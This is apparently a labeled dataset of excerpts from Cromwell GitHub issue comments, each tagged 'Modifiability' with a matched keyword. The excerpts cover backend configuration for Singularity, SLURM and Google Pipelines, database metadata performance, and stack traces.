Modifiability,"m-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.create is not supported for this resource.; ```; and there is clearly an extra role missing as roles `storage.objectCreator`, `storage.objectViewer`, `genomics.pipelinesRunner`, `genomics.admin`, `iam.serviceAccountUser` (corresponding to roles Storage Object Creator, Storage Object Viewer, Genomics Pipelines Runner, Genomics Admin, Service Account User) are not sufficient to create files inside Google buckets. 3) The [permissions](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#permissions) section guides the user into creating a new service account under the current project. This would need to be selected in the configuration file with an authorization with `scheme = ""service_account""` but instead both the configuration file for [PAPIv2](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#setting-up-papiv2) and the configuration file for [PAPIv1](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#lets-get-started) are configured to use an authorization with `scheme = ""application_default""`. I find it very hard to believe that any novel user could go through the tutorial and successfully set up a Cromwell server. On a slightly different note, some of my issues would be resolved if I could run jobs using my user account rather than a service account associated with my project. In the Google [backends](https://cromwell.readthedocs.io/en/stable/backends/Google/) section of the docs there is a lonely mention of the `scheme = ""user_account""` but no further explanation. According to the [source code](https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/test/scala/cromwell/cloudsupport/gcp/GoogleConfigurationSpec.scala) it should be defined as:; ```; {; name = ""user-account""; scheme = ""user_account""; user = ""me""; secrets-file = ""/very/secret/file.txt""; data-store-dir = ""/where/the/data/at""; }; ```; But I was not able to get it to work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349:2914,config,configured,2914,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349,1,['config'],['configured']
Modifiability,make sure to document the configuration in readme and add a sentence that this exists and the changelog,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2056#issuecomment-284927313:26,config,configuration,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2056#issuecomment-284927313,1,['config'],['configuration']
Modifiability,"ment), I was accidentally providing the `--entry-point` param, which was causing an interactive shell to open, stopping the rest of the script from executing. 2. I failed to notice that `${out}` and `${err}` change between `submit` and `submit-docker`. When I would check the job that Cromwell schedules through SLURM, it would always fail. But I'm fairly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:2615,config,config,2615,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['config'],['config']
Modifiability,"mit jobs to other docker or singularity containers) is because of having the docker/singularity submit come from inside the container. We don't really want to do that anyway, because there is a double dependency. But on the other hand, we want to provide reproducible solutions, meaning that things are container based. In an ideal setup, I would have some (still container based) cromwell acting as more of a docker-compose setup, and issuing commands to other containers. Ideally there would be one maintained Docker container for a step in a pipeline, and then if it's run on an HPC resource (where you can't have docker) it would just be dumped into singularity (`docker://<username>/<reponame>`). But this case is a little different - I'm just talking about the cromwell ""plugin"". I don't actually understand why this is necessary, at least given that singularity containers can act like executable. If I want to run a python script, I run it in the command section, as an executable. I don't require a python plugin. Now given that Singularity changes so that we want to take advantage of more of the instance commands (e.g., we can start, stop, get a status) this might make it more like docker and warrant a plugin. But for now, it's not quite there, and making a plugin would just be a really fancy interface to run an executable. Does this make sense?. > @vsoch you're obviously well versed in all things Singularity - do you see any utility to defining the use of a Singularity container in the WDL (ie no matter what this task should always use Singularity) or is it going to be more of a site specific situation, like hwat you're showing here?. I don't think it would be site specific (if the container is singularity, it would largely be the same, a container_uri and then some args to it). The only reason I have two sections is because I was trying out two ways to do it. Neither of them fully work (at least according to cromwell) because I don't know what that job_id business it :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412171685:1544,plugin,plugin,1544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412171685,3,['plugin'],['plugin']
Modifiability,"more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initial",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1294,rewrite,rewrite,1294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906,1,['rewrite'],['rewrite']
Modifiability,"mory: machine_mem + "" MB""; disks: ""local-disk "" + disk_size + "" HDD""; }. output {; File output_bam = ""~{name}.bam""; File output_bai = ""~{name}.bai"". }; }; ```. input:; ```; {; ""Mutect2.tumor_reads"": ""sra://SRR2619134/SRR2619134""; }; ```. wdl:; ```; include required(classpath(""application"")); google {; application-name = ""cromwell""; auths = [; { ; name = ""application-default""; scheme = ""application_default""; }; ]; }; filesystems {; sra {; class = ""cromwell.filesystems.sra.SraPathBuilderFactory""; docker-image = ""fusera/fusera:alpine""; ngc = ""/home/nicholas/.sra/prj_26387_D28121.ngc""; }; }; engine {; filesystems {; gcs {; auth = ""application-default""; }. }; }; backend {; default = PAPIv2; providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; concurrent-job-limit = 10000; max-concurrent-workflows = 10000; genomics-api-queries-per-100-seconds = 10000; maximum-polling-interval = 300; max-workflow-launch-count = 2000; // Google project; project = ""calico-uk-biobank""; compute-service-account = ""default""; // Base bucket for workflow executions; root = ""nicholas-b-test""; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; enable-fuse = true; }; filesystems {; sra {}; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }; }; }; }; }; }; system {; input-read-limits {; lines = 12800000; bool = 7; int = 19; float = 50; string = 1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161:3115,config,config,3115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161,1,['config'],['config']
Modifiability,mwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at crom,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:1949,config,config,1949,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['config'],['config']
Modifiability,"mwell?useSSL=false; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.server.CromwellSystem.$init$(CromwellSystem.scala:24); 	at cromwell.CromwellEntryPoint$$anon$2.<init>(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.$anonfun$buildCromwellSystem$1(CromwellEntryPoint.scala:63); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.CromwellEntryPoint$.buildCromwellSystem(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:47); 	at cromwell.CommandLineParser$.runCromwell(CommandLineParser.scala:95); 	at cromwell.CommandLineParser$.delayedEndpoint$cromwell$CommandLineParser$1(CommandLineParser.scala:105); 	at cromwell.CommandLineParser$delayedInit$body.apply(CommandLineParser.scala:8); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CommandLineParser$.main(CommandLineParser.scala:8); 	at cromwell.CommandLineParser.main(CommandLineParser.scala); Caused by: java.sql.SQLTransientConnectionException: db - Connection is not available, request timed out after 5004ms.; 	at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:548); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:186); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:145); 	at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:83); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:18); 	at slick.jdbc.JdbcBackend$BaseSession.<init>(JdbcBackend.scala:439); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:47); 	at slick.jdbc.JdbcBackend$DatabaseDef.crea",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:2257,adapt,adapted,2257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['adapt'],['adapted']
Modifiability,"n \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4295,config,config,4295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,"n failed for change set changesets/failure_metadata.xml::causedByLists::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteState",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809:1919,Enhance,EnhancedSqlDatabase,1919,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,n.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 11:09:46 cromwell-test_1 | Caused by: liquibase.exception.LockException: java.lang.NullPointerException; 11:09:46 cromwell-test_1 | 	at liquibase.lockservice.StandardLockService.acquireLock(StandardLockService.java:242); 11:09:46 cromwell-test_1 | 	at liquibase.lockservice.StandardLockService.waitForLock(StandardLockService.java:170); 11:09:46 cromwell-test_1 | 	at liquibase.Liquibase.update(Liquibase.java:196); 11:09:46 cromwell-test_1 | 	at liquibase.Liquibase.update(Liquibase.java:192); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:58); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:31); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:96); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 11:09:46 cromwell-test_1 | 	at java.lang.Thread.run(Thread.java:748); 11:09:46 cromwell-test_1 | Caused by: java.lang.NullPointerException: null; 11:09:46 cromwell-test_,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766:4295,Enhance,EnhancedSqlDatabase,4295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,nActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:959); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:951); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:2387,Config,ConfigAsyncJobExecutionActor,2387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"ncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.build(SdkDefaultClientBuilder.java:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:8545,adapt,adapted,8545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['adapt'],['adapted']
Modifiability,"nfig. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr ${""-p "" + queue} \; -t ${runtime_minutes} ${""-c "" + cpus} --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""## PLACE THE CORRECT CONTAINER COMMAND HERE ##""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }; ```. Thanks everyone for the comments above. Edit: Correct mistype: `String queue? → String? queue`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:3526,config,config,3526,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"nfusion, like tabix can't tell a file wasn't already gzipped:; ```; ValueError: Unexpected tabix input: /home/chapmanb/drive/work/cwl/test_bcbio_cwl/gcp/cromwell_work/cromwell-executions/main-somatic.cwl/93ef2d1c-88ee-4dc2-af0a-e0ea86bc785e/call-prep_samples/shard-0/execution/bedprep/cleaned-8539016497173364825.gz; ```; or bwa can't find all the other associated indices:; ```; bwa mem /home/chapmanb/drive/work/cwl/test_bcbio_cwl/gcp/cromwell_work/cromwell-executions/main-somatic.cwl/93ef2d1c-88ee-4dc2-af0a-e0ea86bc785e/call-alignment/shard-1/wf-alignment.cwl/96d7b606-e0fe-4305-a586-e0fc4acf76f8/call-process_alignment/shard-0/inputs/1628767813 [...]. [E::bwa_idx_load_from_disk] fail to locate the index files; ```; Is it expected to lose the original input file names when passing through the pipeline. A lot of tools are sensitive to these and this might be the underlying issue. Regarding the configuration, without `http {}` in under `engine -> filesystems` I get a complaint about it not being supported, even with `http {}` under `backend -> providers -> Local -> config -> filesystems`:; ```; java.lang.IllegalArgumentException: Either https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa exists on a filesystem not supported by this instance of Cromwell, or a failure occurred while building an actionable path from it. Supported filesystems are: LinuxFileSystem. Failures: LinuxFileSystem: Cannot build a local path from https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa (RuntimeException) Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowInitializationFailed(MaterializeWorkflowDescriptorActor.scala:211); at cromw",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425997320:1262,config,configuration,1262,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425997320,2,['config'],"['config', 'configuration']"
